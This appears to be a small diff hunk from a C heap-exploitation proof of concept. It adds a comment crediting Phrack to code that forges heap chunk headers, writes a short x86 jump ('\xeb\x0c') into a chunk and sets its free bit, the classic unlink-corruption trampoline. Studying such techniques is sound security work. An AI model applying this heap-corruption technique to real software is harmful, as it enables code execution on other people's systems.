@@ -69,6 +69,7 @@ int main(void)
   CHUNK *l = TOCHUNK(vp+sizeof(CHUNK)+0x100);
   CHUNK *r = TOCHUNK(vp-sizeof(CHUNK));
 
+  // Do a jmp for 12 bytes as the phrack suggested
   strncpy((char*)l+2, "\xeb\x0c", 2);
   
   SET_FREEBIT(l);
